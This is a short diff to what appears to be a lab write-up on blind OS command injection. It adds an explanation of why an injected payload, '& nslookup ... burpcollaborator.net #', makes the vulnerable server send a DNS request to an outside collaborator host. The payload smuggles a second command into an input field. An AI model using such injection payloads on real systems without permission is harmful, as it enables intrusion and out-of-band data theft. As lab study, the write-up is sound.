@@ -4,4 +4,6 @@ Target Goal - Exploit blind OS command injection to issue a DNS lookup to Burp C
 
 Analysis:
 
- & nslookup zorh37nyfzjbsg1nog7j9ml6zx5ntc.burpcollaborator.net #
+The below mentioned url is burp collaborator url. Here we are sending nslookup request to burp collaborator url. So that in colloborator, we saw that the DNS request received from some IP (where the command injection vulns exist)
+ 
+& nslookup zorh37nyfzjbsg1nog7j9ml6zx5ntc.burpcollaborator.net #
